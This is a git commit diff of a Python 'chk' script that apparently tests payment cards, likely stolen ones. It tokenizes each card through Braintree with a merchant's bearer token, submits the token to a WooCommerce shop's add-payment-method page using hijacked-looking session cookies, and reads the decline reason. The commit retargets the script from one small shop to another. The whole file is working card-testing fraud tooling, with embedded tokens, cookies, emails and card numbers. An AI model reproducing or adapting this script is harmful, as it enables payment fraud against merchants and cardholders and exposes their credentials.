d6c42994ca98783a13ffeec95675a35c832b5b69
yousef12102008 <moh552vbnm@gmail.com>
2024-09-12 14:22:10 +0300

    Update chk2.py

--- chk2.py
+++ chk2.py
@@ -1,3 +1,13 @@
+def capture(string, start, end):
+    start_pos, end_pos = string.find(start), string.find(
+        end, string.find(start) + len(start)
+    )
+    return (
+        string[start_pos + len(start) : end_pos]
+        if start_pos != -1 and end_pos != -1
+        else None
+    )
+    
 def chk(card):
 	
 	import requests, re, base64, random, string, user_agent, time
@@ -50,11 +60,24 @@ def chk(card):
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU4NTY0ODYsImp0aSI6IjllMDIyYzI2LWQxOGEtNDYwZC1hMDkyLTBmODNhYzFkY2E4OCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoic3R1ZHlub3Rlc2FiYWxsY19pbnN0YW50In19.Fakt_qNOLd_iWDpp48iiCyyxUcYck-UQbiq7UhG_MrydggYEe1QYcjsGIf0YGQoIC9hKXkJbShLUqOE1Q7KPjw',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYyMjYyNTEsImp0aSI6IjBhZmE5MDAxLTEwYTgtNDM2ZS04ZGI2LTk3N2QyNTg4MzRiMyIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.K-8QTusUFBDc_u5YirVuT5SV7OxPPdv6XOw4ywiLNmBCO-uI4cN8U7TJPzv2ou_L5KKMj1wR-OxNQLHYbshteg',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -74,7 +97,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '097a3b96-2d72-42ad-bc82-e470056beaf4',
+        'sessionId': 'd99b2e99-983e-47de-b516-6dc0886585e0',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -84,10 +107,6 @@ def chk(card):
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
-                'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': 'hhfhfbfv',
-                },
             },
             'options': {
                 'validate': False,
@@ -101,19 +120,12 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"097a3b96-2d72-42ad-bc82-e470056beaf4"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5332480249303415","expirationMonth":"09","expirationYear":"2028","cvv":"381","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d99b2e99-983e-47de-b516-6dc0886585e0"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 	tok = response.json()['data']['tokenizeCreditCard']['token']
 
 
-
-
-
-
-
-
-
-
+	
 
 
 
@@ -124,40 +136,33 @@ def chk(card):
 
 
 	cookies = {
-    '_ga': 'GA1.1.998389256.1720402750',
-    '_fbp': 'fb.1.1720402754229.108781710779578398',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    'mtk_src_trk': '{"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}',
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'PHPSESSID': '48df3340dbca83c5e8f0cc11345eab56',
+    '_ga': 'GA1.1.42703121.1724799079',
+    'eucookielaw': '1740351081636',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-09-08%2004%3A32%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-09-08%2004%3A32%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-09-12%2011%3A16%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fabout-me%2Fprivacy-policy%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_first_add': 'fd%3D2024-09-12%2011%3A16%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fabout-me%2Fprivacy-policy%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': 'ghdjdjdhh%7C1726979550%7CUMjeR1ohanOmsiSbDgJ2R8uEPJJKUq9aL8hcJmNKkGx%7Caa0029548d83c27bd199263ceec460e3cc76326153941eb1cf51a844cfaa4615',
-    'mailchimp.cart.previous_email': 'ghdjdjdhh@gmail.com',
-    'mailchimp.cart.current_email': 'moh5527vbnm@gmail.com',
-    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
-    '_ga_SGEGXEGQDY': 'GS1.1.1725769930.26.1.1725770087.50.0.0',
-    '_ga_WNQMQBX793': 'GS1.1.1725769932.25.1.1725770091.46.0.0',
-    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
+    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb-3288%7C1727349430%7Cw3XBJrnimrgeHCKiGyDij6kapZm1V4PiZ8Kv79Kgz7S%7Ccd4450030b7a7e4ec0b5a6e9f441c1105e484d563570b9ef0ce8ca9cce262dec',
+    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '253%7C%7C1726312607%7C%7C1726309007%7C%7C9d2ed5c82934787741466962c1d35ea5',
+    'tk_ai': 'jetpack%3ANAg20g2C%2Bwrt9tIviV3VtRCc',
+    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '253%7Cother%7Cread%7C6a3ac1479b4c0599123956c2ae54a7670862df3c9baf9d6eda63df80623c9ab6',
+    '_ga_EX1GV7CW1V': 'GS1.1.1726139785.4.1.1726139832.0.0.0',
+    '_ga_347410393': 'GS1.1.1726139785.4.1.1726139833.0.0.0',
+    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
-    'authority': 'www.studynotesaba.com',
+    'authority': 'www.carolyngibbsquilts.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.998389256.1720402750; _fbp=fb.1.1720402754229.108781710779578398; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; mtk_src_trk={"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}; mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=48df3340dbca83c5e8f0cc11345eab56; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-08%2004%3A32%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-08%2004%3A32%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=ghdjdjdhh%7C1726979550%7CUMjeR1ohanOmsiSbDgJ2R8uEPJJKUq9aL8hcJmNKkGx%7Caa0029548d83c27bd199263ceec460e3cc76326153941eb1cf51a844cfaa4615; mailchimp.cart.previous_email=ghdjdjdhh@gmail.com; mailchimp.cart.current_email=moh5527vbnm@gmail.com; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725769930.26.1.1725770087.50.0.0; _ga_WNQMQBX793=GS1.1.1725769932.25.1.1725770091.46.0.0; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'origin': 'https://www.studynotesaba.com',
+    # 'cookie': '_ga=GA1.1.42703121.1724799079; eucookielaw=1740351081636; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-12%2011%3A16%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fabout-me%2Fprivacy-policy%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2024-09-12%2011%3A16%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fabout-me%2Fprivacy-policy%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb-3288%7C1727349430%7Cw3XBJrnimrgeHCKiGyDij6kapZm1V4PiZ8Kv79Kgz7S%7Ccd4450030b7a7e4ec0b5a6e9f441c1105e484d563570b9ef0ce8ca9cce262dec; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=253%7C%7C1726312607%7C%7C1726309007%7C%7C9d2ed5c82934787741466962c1d35ea5; tk_ai=jetpack%3ANAg20g2C%2Bwrt9tIviV3VtRCc; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=253%7Cother%7Cread%7C6a3ac1479b4c0599123956c2ae54a7670862df3c9baf9d6eda63df80623c9ab6; _ga_EX1GV7CW1V=GS1.1.1726139785.4.1.1726139832.0.0.0; _ga_347410393=GS1.1.1726139785.4.1.1726139833.0.0.0; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://www.carolyngibbsquilts.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -169,25 +174,36 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"d76b61f672851b68610a1cc9d4bd7783","fraud_merchant_id":null,"correlation_id":"097a3b96-2d72-42ad-bc82-e470056b"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU4NTYzNTcsImp0aSI6Ijg4ZTk1ZWY5LTk5NzAtNDBlOC05OWMwLWI1OWRmNjgyZTFhZSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.RaePpw_MRhspJo1HJ54FnQRagbp5W4rarVW-KF_PcmzIRVgWjStuksp3ZmifBNRS5rvAk8pcwL2QRt-jZLhG2Q","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': 'ddb940abb7',
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"5f8387ba9ac2549b8919ed6a49d62b27"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce',tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"5f8387ba9ac2549b8919ed6a49d62b27"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', '6557de91be'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
 	response = requests.post(
-    'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
 )
-	text = response.text
 	pattern = r'Reason: (.*?)\s*</li>'
+    
+	text = response.text
 	
 	match = re.search(pattern, text)
 	if match:
@@ -201,6 +217,5 @@ def chk(card):
 			result = "Error"
 			
 	return result
-
-
+	
 	
